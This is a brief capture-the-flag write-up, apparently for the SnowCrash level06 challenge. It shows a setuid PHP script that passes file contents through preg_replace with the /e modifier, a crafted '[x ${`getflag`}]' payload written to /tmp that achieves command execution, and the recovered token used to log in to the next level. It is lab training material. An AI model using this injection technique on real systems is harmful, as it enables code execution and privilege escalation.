## Check files in home

ls -la

->  -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
	-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

## check level06.php, this files have permissions in flag06 when executed then

cat level06.php

```php
<?php
	function y($m) {
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}
	function x($y, $z) {
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);
		return $a;
	}
	$r = x($argv[1], $argv[2]); print $r;
?>
```

# create a file with an exploit to execute get flag in this line "$r = x($argv[1], $argv[2]); print $r;"

echo '[x ${`getflag`}]' > /tmp/exploit

# finally execute level06 script with the exploit file

./level06 /tmp/exploit

->  PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	in /home/user/level06/level06.php(4) : regexp code on line 1

## Log in to user level07
su level07 (password: wiok45aaoguiboiki2tuin6ub)